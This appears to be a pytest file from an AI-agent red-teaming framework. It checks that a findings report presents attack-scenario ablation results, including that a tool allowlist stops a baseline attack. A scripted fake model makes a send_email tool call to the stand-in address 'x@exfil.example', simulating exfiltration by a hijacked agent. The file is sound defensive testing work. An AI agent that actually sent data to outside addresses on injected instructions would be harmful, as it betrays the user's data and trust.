"""The findings report is built from the findings files and the ablation log."""

from __future__ import annotations

from pathlib import Path

import anyio
import pytest

from agent_risk_framework.agent.model import FakeToolModel
from agent_risk_framework.attacks.ablation import run_matrix, select_arms
from agent_risk_framework.attacks.ablation_report import summarize
from agent_risk_framework.attacks.scenarios import load_catalog
from agent_risk_framework.benign import load_benign_tasks
from agent_risk_framework.findings.report import find_browser, load_findings, render_html
from agent_risk_framework.runlog import RunLog

REPO_ROOT = Path(__file__).resolve().parent.parent


class Scripted(FakeToolModel):
    """Mails an outside address once per run, then answers."""

    def __init__(self) -> None:
        super().__init__(
            [[("send_email", {"to": "x@exfil.example", "subject": "s", "body": "b"})], "done"]
        )

    def generate(self, messages, tools, params=None):  # type: ignore[no-untyped-def]
        self._i = sum(m["role"] == "assistant" for m in messages)
        return super().generate(messages, tools, params)


@pytest.fixture(scope="module")
def stats():  # type: ignore[no-untyped-def]
    scenarios = [
        s
        for s in load_catalog(REPO_ROOT / "data" / "attack_scenarios.json").scenarios
        if s.scenario_id in ("AC01", "AC01-OBF")
    ]
    tasks = load_benign_tasks(REPO_ROOT / "data" / "benign_tasks.json")[:2]
    arms = select_arms(["baseline", "tool_permissions", "input_classifier", "combined"])
    with RunLog() as log:
        anyio.run(
            lambda: run_matrix(
                model=Scripted(),
                run_log=log,
                scenarios=scenarios,
                tasks=tasks,
                arms=arms,
                runs=1,
                base_sandbox=REPO_ROOT / "data" / "agent_sandbox",
                doc_index=REPO_ROOT / "data" / "doc_index.json",
            )
        )
        return summarize(log)


def test_findings_load_sorted_by_severity() -> None:
    findings = load_findings(REPO_ROOT / "findings")
    severities = [str(f.severity) for f in findings]
    assert len(findings) == 9
    assert severities == sorted(severities, key=("critical", "high", "medium", "low").index)


def test_report_has_every_section_and_the_retest(stats, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    findings = load_findings(REPO_ROOT / "findings")
    html = render_html(
        findings,
        stats,
        chart=REPO_ROOT / "docs" / "phase4_ablation.svg",
        demo_frame=tmp_path / "missing.svg",
        generated="2026-01-01",
    )
    for heading in (
        "Executive summary",
        "1. Scope",
        "2. Methodology",
        "3. Findings",
        "4. Ablation results",
        "5. Retest notes and limitations",
    ):
        assert f"{heading}</h2>" in html
    assert all(f"{f.finding_id}: " in html for f in findings)
    # AC01 succeeds at baseline with the scripted model and is stopped by the allowlist.
    assert "Retest.</strong> Baseline 2/2 (100%); all six controls 0/2 (0%)" in html
    assert "Stopped with credit by, alone: tool_permissions." in html
    assert "data:image/svg+xml;base64," in html  # the chart, isolated as an image
    assert "(figure missing.svg not found)" in html
    assert chr(0x2014) not in html  # no em dashes in published output
    assert "Generated 2026-01-01" in html


def test_report_needs_the_comparison_arms(stats) -> None:  # type: ignore[no-untyped-def]
    with pytest.raises(ValueError, match="baseline and combined"):
        render_html([], stats[1:2], chart=Path("x"), demo_frame=Path("y"))


def test_explicit_browser_wins() -> None:
    assert find_browser("some/browser") == Path("some/browser")
